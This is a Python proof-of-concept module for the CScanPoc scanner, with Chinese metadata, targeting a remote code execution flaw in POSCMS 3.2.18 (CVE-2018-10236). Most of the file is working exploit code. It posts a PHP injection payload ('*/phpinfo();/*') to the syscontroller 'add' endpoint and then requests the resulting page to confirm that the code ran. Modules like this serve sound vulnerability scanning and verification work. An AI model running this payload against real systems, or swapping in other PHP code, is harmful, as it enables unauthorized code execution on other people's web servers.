# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'POSCMS_0001_L'  # 平台漏洞编号，留空
    name = 'POSCMS代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-05-11'  # 漏洞公布时间
    desc = '''
        POSCMS（PhpOpenSourceCMS）是中国天睿信息技术公司的一套基于PHP和MySQL的、开源的、跨平台网站内容管理系统（CMS）。  
        POSCMS 3.2.18版本中存在安全漏洞。远程攻击者可借助diy\dayrui\controllers\admin\Syscontroller.php文件中的‘add’函数利用该漏洞执行任意的PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-09381'  # 漏洞来源
    cnvd_id = 'CNVD-2018-09381'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10236 '  # cve编号
    product = 'POSCMS'  # 漏洞应用名称
    product_version = '3.2.18版 '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e766c412-dfcd-4ed7-a859-392d70a7fab6'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 先注册一个帐号并登录，然后访问：
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            payload = "/admin.php?c=syscontroller&m=add&post=1"
            data = "data%5Bname%5D=myndtt*/phpinfo();/*&data%5Bcname%5D=myndtt&app=0&data%5Btype%5D%5B%5D=0&data%5Bmeta_title%5D=1234&data%5Bmeta_keywords%5D=123&data%5Bmeta_descrintion%5D=123"
            url = self.target + payload
            requests.post(url, cookies=cookies, data=data)

            verify_url = self.target + '/index.php?c=myndtt&m=index'
            r = requests.get(verify_url)

            if 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
